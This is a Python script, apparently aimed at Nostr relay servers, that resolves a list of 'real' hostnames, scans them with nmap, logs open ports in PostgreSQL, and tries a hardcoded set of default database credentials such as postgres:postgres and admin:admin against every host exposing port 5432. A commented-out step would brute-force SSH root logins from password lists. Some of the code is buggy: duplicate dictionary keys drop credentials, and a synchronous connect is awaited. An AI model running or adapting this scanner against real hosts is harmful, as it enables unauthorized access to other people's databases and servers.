import asyncio
import socket
import nmap
import psycopg2
import paramiko
import traceback
import time
import os
#from ssh_login import ssh_login
from dotenv import load_dotenv

GREEN = '\033[32m'
RED = '\033[31m'
RESET = '\033[0m'
YELLOW = '\033[33m'

load_dotenv()

conn = psycopg2.connect(
    host=os.getenv('DB_HOST'),
    port=os.getenv('DB_PORT'),
    dbname=os.getenv('DB_NAME'),
    user=os.getenv('DB_USER'),
    password=os.getenv('DB_PASSWORD')
)

def initialize_database():
    # Load environment variables from .env file
    try:
        cur = conn.cursor()
        # Create the 'hosts' table
        cur.execute("""
            CREATE TABLE IF NOT EXISTS hosts (
                id SERIAL PRIMARY KEY,
                hostname VARCHAR(255),
                ip_address VARCHAR(255),
                open_ports VARCHAR(255),
                postgres_open BOOLEAN,
                last_scanned BIGINT
            );
        """)

        conn.commit()

        print("Database initialization complete.")

    except psycopg2.Error as e:
        print(f"Error occurred during database initialization: {e}")


initialize_database()

def read_hostnames_file():
    # Open the file for reading
    with open('real_hosts.txt', 'r') as f:
        # Read all lines from the file into a list
        hostnames = f.readlines()

    # Strip newline characters from each line in the list
    hostnames = [hostname.strip() for hostname in hostnames]

    # Return the list of hostnames
    return hostnames

hostnames = read_hostnames_file()

credentials = {
    'postgres': 'postgres',
    'nostr': 'nostr',
    'nostr_ts_relay': 'nostr_ts_relay',
    'postgres': 'password',
    'postgres': 'admin',
    'admin': 'admin',
    'admin': 'password'
}

async def resolve_hosts(hosts):
    results = {}
    cur = conn.cursor()
    for host in hosts:
        cur.execute("SELECT ip_address FROM hosts WHERE hostname = %s", (host,))
        result = cur.fetchone()
        if result is not None:
            ip_address = result[0]
            if ip_address == 'offline':  # check if ip_address is offline
                try:
                    ip = await asyncio.get_event_loop().getaddrinfo(host, None)
                    ip_address = ip[0][4][0]
                    cur.execute("UPDATE hosts SET ip_address = %s WHERE hostname = %s", (ip_address, host))
                    conn.commit()
                except socket.error as err:
                    print(f"Error resolving {host}: {err}")
                    ip_address = None
            else:
                # Host already exists in the database, no need to add it again
                continue
        else:
            try:
                ip = await asyncio.get_event_loop().getaddrinfo(host, None)
                ip_address = ip[0][4][0]
                cur.execute("INSERT INTO hosts (hostname, ip_address) VALUES (%s, %s)", (host, ip_address))
                conn.commit()
            except socket.error as err:
                print(f"Error resolving {host}: {err}")
                ip_address = None

        results[host] = ip_address

    return results

import socket

import socket

async def scan_host(host, hostname, scanner):
    print(f"Scanning host {hostname} ({host})...")
    cur = conn.cursor()

    try:
        # Attempt hostname resolution
        ip_address = socket.gethostbyname(host)
        if ip_address is None:
            print(f"{RED}Skipping host {hostname} ({host}): failed to resolve IP address{RESET}")
            return None

        cur.execute("SELECT last_scanned FROM hosts WHERE hostname = %s", (hostname,))
        last_scanned = cur.fetchone()[0]

        if last_scanned is not None and time.time() - last_scanned < 24 * 60 * 60:
            print(f"{YELLOW}Skipping host {hostname} ({host}): already scanned within the last 24 hours{RESET}")
            return None

        cur.execute("SELECT hostname FROM hosts WHERE hostname = %s", (hostname,))
        if cur.fetchone():
            print(f"{YELLOW}Skipping host {hostname} ({host}): already exists in the database{RESET}")
            return None

        cur.execute("INSERT INTO hosts (hostname, ip_address) VALUES (%s, %s)", (hostname, ip_address))
        conn.commit()
        print(f"{GREEN}New host {hostname} ({host}) added to the database{RESET}")

        scanner.scan(host)
        results = scanner[host]['tcp']

        open_ports = [port for port, data in results.items() if data['state'] == 'open']

        if any(len(str(port)) > 255 for port in open_ports):
            print(f"{RED}Skipping host {hostname} ({host}): open_ports data exceeds 255 characters{RESET}")
            return None

        if 5432 in open_ports:
            try:
                print(f"{GREEN}Port 5432 is open on host {RESET}{hostname} ({host})!")
                cur.execute("UPDATE hosts SET postgres_open = true WHERE hostname = %s", (hostname,))
                conn.commit()
                print(f"{GREEN}Database record updated for host {RESET}{hostname} ({host}){RESET}")
            except Exception as e:
                print(f"{RED}Error updating database for host {hostname} ({host}): {str(e)}{RESET}")
                traceback.print_exc()
                return None

        open_ports_str = ','.join(str(port) for port in open_ports)
        cur.execute("UPDATE hosts SET open_ports = %s WHERE hostname = %s", (open_ports_str, hostname))
        conn.commit()
        print(f"{GREEN}Open ports ({open_ports}) updated in the database for host {RESET}{hostname} ({host}){RESET}")

        return hostname

    except socket.gaierror as e:
        print(f"{RED}Error resolving hostname {host}: {str(e)}{RESET}")
        return None

    except Exception as e:
        print(f"{RED}Error occurred while scanning host {hostname} ({host}): {str(e)}")
        traceback.print_exc()
        return None





# Define the function to run if conditions are met
async def postgres_enum(ip_address, port_list):

    cur = conn.cursor()
    
    # Query the database for rows with a list of ports in the open_ports column
    cur.execute("SELECT hostname, open_ports FROM hosts WHERE open_ports IS NOT NULL")
    
    # Loop through the results
    for row in cur.fetchall():
        ip_address = row[0]
        open_ports = row[1]
        if isinstance(open_ports, list) and ip_address is not None:
            # Call the function with the IP address and port list
            postgres_enum(ip_address, open_ports)



async def connect_to_postgres(hosts, credentials):
    for host in hosts:
        for username, password in credentials.items():
            try:
                conn = await psycopg2.connect(
                    host=host,
                    user=username,
                    password=password
                )
                print(f"{GREEN}Successfully connected to PostgreSQL on {RESET}{host} {GREEN}using credentials: {RESET}{username}:{password}")
                conn.close()
                break  # Stop trying credentials if one works
            except Exception as e:
                print(f"{RED}Could not connect to PostgreSQL on {RESET}{host} {RED}with credentials: {RESET}{username}:{password}: {e}")


def list_checker():
    cur = conn.cursor()
    cur.execute("SELECT hostname, open_ports FROM hosts")
    rows = cur.fetchall()
    for row in rows:
        host, open_ports = row
         
        if open_ports is None:   # Skip the row if open_ports is None
            continue
        elif not isinstance(open_ports, list):
            port_list = []
            for port in open_ports.split(','):
                port = port.strip()
                if port.isdigit():
                    port_list.append(int(port))
            cur.execute("UPDATE hosts SET open_ports = %s WHERE hostname = %s", (port_list, host))
            conn.commit()


async def main():
    try:
        # Resolve hosts asynchronously
        list_checker()
        host_dict = await resolve_hosts(hostnames)
        print(host_dict)

        # Create a new Nmap scanner object
        scanner = nmap.PortScanner()

        # Scan hosts and collect open ports
        postgres_open = await asyncio.gather(
            *[scan_host(host, hostname, scanner) for hostname, host in host_dict.items()]
        )
        postgres_open = [host for host in postgres_open if host is not None]

        # Connect to PostgreSQL using collected open hosts and credentials
        await connect_to_postgres(postgres_open, credentials)

        # Perform SSH login on the resolved hosts
        #await ssh_login('usernames.txt', 'common_root_passwords.txt')
        
    except Exception as e:
        print(f"{RED}Error running main function: {str(e)}{RESET}")

# Run the main function
asyncio.run(main())

